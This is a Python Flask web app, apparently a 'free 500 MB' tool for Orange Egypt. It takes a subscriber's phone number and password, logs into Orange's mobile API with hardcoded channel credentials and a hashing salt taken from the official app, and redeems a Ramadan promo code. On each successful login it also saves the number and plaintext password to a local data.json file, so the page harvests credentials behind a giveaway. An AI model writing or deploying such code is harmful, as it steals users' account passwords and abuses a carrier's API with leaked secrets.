from flask import Flask,request,render_template_string,render_template
import json,datetime,requests
from hashlib import sha256
app=Flask(__name__)

@app.route("/")
def sh1():
	return render_template("index.html",login="Login Form")
@app.route("/n",methods=["GET"])
def sh():
	user=request.args.get("number")
	password=request.args.get("pas")
	
	if user =="" or password == "":
		return render_template_string("<center><h1>الحقل فارغ من فضلك املا البيانات</h1></center>")
	
	else:
		with requests.Session()as req:
			url1="https://services.orange.eg/SignIn.svc/SignInUser"
			
			def get_ctv_and_htv():
			     try:
			     	url = 'https://services.orange.eg/GetToken.svc/GenerateToken'
			     	headers = {
			     	"Content-Type": "application/json; charset=UTF-8",
			     	"Content-Length": "78",
			     	"Host": "services.orange.eg",
			     	"Connection": "Keep-Alive",
			     	"User-Agent": "okhttp/3.12.1"}
			     	data = {
			     	"channel": {
			     	"ChannelName": "MobinilAndMe",
			     	"Password": "ig3yh*mk5l42@oj7QAR8yF"
			     	}}
			     	r = requests.post(url, headers=headers, json=data).json()
			     	ctv = r["GenerateTokenResult"]["Token"]
			     	a = ctv + ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
			     	htv = (sha256(a.encode('utf-8')).hexdigest().upper())
			     	return ctv + ' ' + htv
			     except :
			     	return "Error"
			ctv_htv = get_ctv_and_htv().split(' ')
			if ctv_htv == ["Error"]:
				return render_template("index.html",login=ctv_htv[0])
			else:
				ctv = ctv_htv[0]
				htv = ctv_htv[1]
				
				head={"_ctv": ctv,
				"_htv": htv,"Content-Type": "application/json; charset=UTF-8",
				"Content-Length": "167",
				"Host": "services.orange.eg",
				"Connection": "Keep-Alive",
				"Accept-Encoding": "gzip",
				"User-Agent": "okhttp/3.14.9"}
				data='{"appVersion":"6.2.0","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","isAndroid":true,"password":"%s"}'%(user,password)
				r=req.post(url1,headers=head,data=data)
				#print(r)
				if r.json()["SignInUserResult"]["ErrorDescription"]=="Success":
					file=open("data.json","r")
					js=json.load(file)
					add=(len(js.keys()))
					data1=str(datetime.datetime.now())[0:10]
					js.update({str(user):[password,data1]})
					p=json.dumps(js)
					file=open("data.json","w")
					file.write(p)
					print(file)
					id=r.json()["SignInUserResult"]["UserData"]["UserID"]
					url2 = "https://services.orange.eg/APIs/Promotions/api/CAF/Redeem"

					ctv_htv = get_ctv_and_htv().split(' ')
					ctv = ctv_htv[0]
					htv = ctv_htv[1]
					head = {"_ctv": ctv,
					"_htv": htv,
					"isEasyLogin": "false",
					"UserId": id,
					"Content-Type": "application/json; charset=UTF-8",
					"Content-Length": "190",
					"Host": "services.orange.eg",
					"Connection": "Keep-Alive",
					"Accept-Encoding": "gzip",
					"User-Agent": "okhttpwhitepro/3.12.1"}
					data={"Language":"ar","OSVersion":"Android7.0","PromoCode":"رمضان كريم","dial":user,"password":password,"Channelname":"MobinilAndMe","ChannelPassword":"ig3yh*mk5l42@oj7QAR8yF"}
					r2=req.post(url2,headers=head,json=data).json()
					#print(r2)
					if r2['ErrorDescription']=='Success':
						return render_template("index.html",login="تم اضافة 500 ميجا بنجاح")
						
						
					else:
						return render_template("index.html",login=r2["PromoStartup"]["Text"])
						
				
				else:
					return render_template("index.html",login="Error Number Password")
					
			
			
if __name__=="__main__":
	app.run(debug=True,port=5000)